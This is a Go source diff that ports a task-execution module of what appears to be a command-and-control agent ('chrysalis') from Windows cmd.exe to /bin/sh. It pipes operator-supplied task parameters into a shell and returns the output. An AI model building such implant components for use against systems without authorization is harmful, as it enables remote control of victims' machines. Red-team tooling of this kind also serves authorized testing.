@@ -1,28 +1,30 @@
-package cmd_executor
+package sh_executor
 
 import (
 	// Standard
 	"bytes"
+	"os"
 	"os/exec"
+	"strings"
 
-	// chrysalis
+	// src
 
 	"github.com/FractalKnight/chrysalis/pkg/utils/structs"
 )
 
-// Run - Function that executes the cmd_executor command
+// Run - Function that executes the sh_executor command
 func Run(task structs.Task) {
 	msg := structs.Response{}
 	msg.TaskID = task.TaskID
-	cmdBin := "cmd"
-	arg1 := "/C"
-	if _, err := exec.LookPath(cmdBin); err != nil {
-		msg.SetError("Could not find cmd.exe")
+	shBin := "/bin/sh"
+	if _, err := os.Stat(shBin); err != nil {
+		msg.SetError("Could not find /bin/sh")
 		task.Job.SendResponses <- msg
 		return
 	}
 
-	cmd := exec.Command(cmdBin, arg1, task.Params)
+	cmd := exec.Command(shBin)
+	cmd.Stdin = strings.NewReader(task.Params)
 	var out bytes.Buffer
 	cmd.Stdout = &out
 	cmd.Stderr = &out
